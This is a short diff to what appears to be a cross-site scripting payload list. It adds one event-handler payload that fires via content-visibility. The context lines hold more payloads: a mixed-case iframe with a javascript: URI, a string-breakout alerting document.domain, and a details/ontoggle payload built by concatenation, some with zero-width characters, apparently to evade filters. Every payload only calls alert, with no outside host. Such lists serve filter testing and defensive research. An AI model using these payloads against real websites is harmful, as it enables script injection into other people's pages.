@@ -1,3 +1,4 @@
+<input type="hidden" oncontentvisibilityautostatechange​="alert(/ChromeCanary/)" style="content-visibility:auto">
 <iFrAme/src=jaVascRipt​:alert(1)></iFramE>
 ";window.stop();alert(document.domain);// 
 <details open ontoggle​=content['al'%2B'ert'](1) >
